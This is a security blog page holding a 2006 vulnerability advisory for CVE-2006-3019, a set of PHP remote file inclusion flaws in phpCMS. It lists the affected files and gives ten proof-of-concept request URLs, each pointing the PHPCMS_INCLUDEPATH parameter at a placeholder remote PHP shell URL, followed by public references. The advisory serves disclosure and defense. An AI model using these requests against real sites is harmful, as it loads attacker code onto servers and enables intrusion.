<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
	<meta http-equiv="X-UA-Compatible" content="chrome=1">
	<title>CVE-2006-3019 – phpCMS <= 1.2.1pl2 - Multiple Vulnerabilities</title>
	<meta name="description" content="">
	<meta name="author" content="Federico Fazzi">
	<link rel="stylesheet" href="/assets/app-9aa3a0497cf8b7ed5697ebed051cfe57.css">
	<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
	<link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">
	<link rel="canonical" href="http://deftcode.ninja/post/CVE-2006-3019-phpcms-multiple-vulnerabilities/">

	<!--[if lt IE 9]>
	<script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->
	
	<script>
		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
		(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
		m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
		})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

		ga('create', 'UA-55598198-1', 'auto');
		ga('send', 'pageview');
	</script>
</head>

<body>
	<button id="toggle" class="standard-width" type="button" data-toggle="collapse">
		<span class="toggle-line"></span>
		<span class="toggle-line"></span>
		<span class="toggle-line"></span>
	</button>
	<div class="wrapper">
		<header>
	<h1>DEFTCODE<sup>( 2 )</sup></h1>

	<ul id="navbar">
		<li><a href="http://deftcode.ninja" title="Posts">Posts</a></li>
		<li><a href="http://deftcode.ninja/security" title="Security">Security</a></li>
		<li><a href="http://deftcode.ninja/about" title="About">About</a></li>
	</ul>

	<ul id="social" class="apicos-social-sport">
		
		<li><a href="https://github.com/eurialo" title="Github" target="_blank"><span class="apico apico-github-square"></span></a></li>
		
		
		<li><a href="https://linkedin.com/in/eurialo" title="Linkedin" target="_blank"><span class="apico apico-linkedin-square"></span></a></li>
		
		
		<li><a href="https://twitter.com/federicofazzi" title="Twitter" target="_blank"><span class="apico apico-twitter-square"></span></a></li>
		
		
		<li><a href="https://plus.google.com/+FedericoFazzi" title="Google+" target="_blank"><span class="apico apico-google-plus-square"></span></a></li>
		
		<li><a href="/feed.xml" title="Feed RSS" target="_blank"><span class="apico apico-rss-square"></span></a></li>
	</ul>
	<p>
		<small><a href="https://pgp.mit.edu/pks/lookup?search=0x6D378CAF&op=index&exact=on" title="MIT PGP Public Key Server - 0x6D378CAF" target="_blank">GPG - 2048R/6D378CAF</a></small>
	</p>
</header>
		<section>
		<h1 class="post-title">CVE-2006-3019 – phpCMS <= 1.2.1pl2 - Multiple Vulnerabilities</h1>
<p class="post-meta">RELEASED IN MONDAY 12, JUNE, 2006</p>

<h3 id="vendor">Vendor</h3>

<blockquote>
  <p>phpCMS is more than just a content management system: it is also a templating engine and an application framework.</p>
</blockquote>

<p><a href="http://www.phpcms.de/" title="phpCMS">http://www.phpcms.de/</a></p>

<h3 id="description">Description</h3>

<p>Multiple <code>PHP Remote File Inclusion</code> (RFI) vulnerabilities in <code>phpCMS 1.7 - 1.2.1pl2</code> (other versions may also be affected) allow remote attackers to execute arbitrary PHP code via a URL in the <strong>PHPCMS_INCLUDEPATH</strong> parameter.</p>

<h3 id="affected-files">Affected Files</h3>

<ul>
  <li>(1) class.parser_phpcms.php,</li>
  <li>(2) class.session_phpcms.php,</li>
  <li>(3) class.edit_phpcms.php,</li>
  <li>(4) class.http_indexer_phpcms.php,</li>
  <li>(5) class.cache_phpcms.php,</li>
  <li>(6) class.search_phpcms.php,</li>
  <li>(7) class.lib_indexer_universal_phpcms.php,</li>
  <li>(8) class.layout_phpcms.php,</li>
  <li>(9) parser/plugs/counter.php,</li>
  <li>(10) parser/parser.php.</li>
</ul>

<h3 id="proof-of-concept">Proof of Concept</h3>

<p><strong>~</strong> stands for <code>[php-shell-url]</code></p>

<ol>
  <li>http://localhost/[pc_path]/parser/include/class.parser_phpcms.php?PHPCMS_INCLUDEPATH=
<strong>~</strong></li>
  <li>http://localhost/[pc_path]/parser/include/class.session_phpcms.php?PHPCMS_INCLUDEPATH=
<strong>~</strong></li>
  <li>http://localhost/[pc_path]/parser/include/class.edit_phpcms.php?PHPCMS_INCLUDEPATH=
<strong>~</strong></li>
  <li>http://localhost/[pc_path]/parser/include/class.http_indexer_phpcms.php?PHPCMS_INCLUDEPATH=
<strong>~</strong></li>
  <li>http://localhost/[pc_path]/parser/include/class.cache_phpcms.php?PHPCMS_INCLUDEPATH=
<strong>~</strong></li>
  <li>http://localhost/[pc_path]/parser/include/class.search_phpcms.php?PHPCMS_INCLUDEPATH=
<strong>~</strong></li>
  <li>http://localhost/[pc_path]/parser/include/class.lib_indexer_universal_phpcms.php?PHPCMS_INCLUDEPATH=
<strong>~</strong></li>
  <li>http://localhost/[pc_path]/parser/include/class.layout_phpcms.php?PHPCMS_INCLUDEPATH=
<strong>~</strong></li>
  <li>http://localhost/[pc_path]/parser/plugs/counter.php?PHPCMS_INCLUDEPATH=
<strong>~</strong></li>
  <li>http://localhost/[pc_path]/parser/parser.php?PHPCMS_INCLUDEPATH=
<strong>~</strong>/</li>
</ol>

<h3 id="references">References</h3>

<ul>
  <li><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3019" title="CVE 2006-3019">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3019</a></li>
  <li><a href="http://www.securityfocus.com/bid/21768" title="SecurityFocus-21768">http://www.securityfocus.com/bid/21768</a></li>
  <li><a href="http://www.osvdb.org/26388" title="OSVDB-26388">http://www.osvdb.org/26388</a></li>
  <li><a href="http://secunia.com/advisories/20573" title="Secunia-20573">http://secunia.com/advisories/20573</a></li>
</ul>



<!-- Go to www.addthis.com/dashboard to customize your tools -->
<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-538ce0c960e04da4" async></script>
<!-- Go to www.addthis.com/dashboard to customize your tools -->
<div class="addthis_sharing_toolbox"></div>

<div id="disqus_thread"></div>
<script type="text/javascript">
	/* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
	var disqus_shortname = 'deftcode'; // required: replace example with your forum shortname

	/* * * DON'T EDIT BELOW THIS LINE * * */
	(function() {
		var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
		dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
		(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
	})();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

		</section>
		<footer>
	<p><small>2017 – <b><a href="http://en.wikipedia.org/wiki/MIT_License" title="Wikipedia.org - MIT License" target="_blank">MIT License</a></b></small></p>
</footer>
<script src="/assets/app-cfd2668a2a4934bd07f418c9af7461f6.js"></script>
	</div>
</body>
</html>
